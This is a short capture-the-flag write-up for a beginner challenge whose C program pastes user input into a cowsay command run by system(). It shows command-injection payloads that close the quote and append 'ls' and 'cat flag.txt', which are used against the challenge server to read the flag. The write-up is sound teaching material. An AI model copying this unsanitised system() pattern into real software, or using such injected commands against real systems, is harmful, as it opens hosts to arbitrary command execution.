## runway0 [50 pts]

**Category:** beginner-pwn
**Solves:** 347

## Description
beginner-pwn4 / 6

If you've never done a CTF before, this runway should help!

Hint: MacOS users (on M series) will need a x86 Linux VM. Tutorial is here: pwnoh.io/utm


nc challs.pwnoh.io 13400 

### Solution

Checking the binary:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char command[110] = "cowsay \"";
    char message[100];

    printf("Give me a message to say!\n");
    fflush(stdout);

    fgets(message, 0x100, stdin);

    strncat(command, message, 98);
    strncat(command, "\"", 2);

    system(command);
}
```

It's a simple command injection, we should close `cowsay` command and insert our commands. 

Send sample payload like `"; ls`

```bash
nc challs.pwnoh.io 13400 
Give me a message to say!
hello"; ls
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
flag.txt
run
sh: 2: Syntax error: Unterminated quoted string

```

Ok let's read the flag now:

```bash
$ nc challs.pwnoh.io 13400 
Give me a message to say!
hello"; cat flag.txt
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
bctf{flaghere}sh: 2: Syntax error: Unterminated quoted string
```
